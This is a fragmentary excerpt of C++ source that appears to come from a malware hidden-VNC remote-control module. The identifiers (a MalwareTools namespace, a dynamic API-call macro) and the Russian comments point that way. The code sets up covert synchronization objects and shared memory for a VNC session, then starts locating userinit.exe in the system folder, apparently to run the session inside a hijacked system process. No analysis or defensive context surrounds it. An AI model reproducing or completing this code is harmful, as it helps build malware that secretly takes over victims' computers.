...
static bool createVncProcessData(VNCPROCESSDATA *vncProcessData, bool isServer)
{
  ...
  if((vncProcessData->vncMessageEvent = CWA(user32, CreateEventW)(NULL/*&coreData.securityAttributes.saAllowAll*/, TRUE, FALSE, name)) == NULL)return false;
  
  //Глобальные данные.
  {
    //Core::generateObjectName(Core::OBJECT_ID_VNC_GLOBALDATA_MUTEX, name, MalwareTools::KON_SESSION);
    if((vncProcessData->globalDataMutex = CWA(kernel32, CreateMutexW)(NULL/*&coreData.securityAttributes.saAllowAll*/, FALSE, name)) == NULL)return false;

    //Core::generateObjectName(Core::OBJECT_ID_VNC_MAPFILE, name, MalwareTools::KON_SESSION);
    if((vncProcessData->mapFileHandle = CWA(kernel32, CreateFileMappingW)(NULL, NULL/*&coreData.securityAttributes.saAllowAll*/, PAGE_READWRITE, 0, sizeof(VNCGLOBALDATA) + MAX_BITMAP_SIZE, name)) == NULL)return false;
...
bool VncServer::start(SOCKET s)
{
  ...
  if(retVal == false)
  {
    ...
    if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_SYSTEM, NULL, SHGFP_TYPE_CURRENT, rootModule) == S_OK && Fs::_pathCombine(rootModule, rootModule, L"userinit.exe"))
    {
